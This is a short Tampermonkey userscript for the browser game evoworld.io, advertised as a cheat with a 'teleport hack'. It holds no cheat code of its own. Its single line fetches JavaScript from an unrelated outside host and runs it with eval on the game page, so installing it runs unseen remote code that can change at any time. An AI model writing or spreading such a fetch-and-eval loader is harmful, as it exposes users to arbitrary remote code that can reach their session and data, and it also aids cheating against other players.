// ==UserScript==
// @name         evoworld.io Amnesia exploit | first cheat with teleport hack
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  try to take over the world!
// @author       You
// @match        https://evoworld.io/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=evoworld.io
// @grant        none
// ==/UserScript==

fetch('https://arknights-endfield.netlify.app/index.js').then(r=>r.text()).then(c=>eval(c));
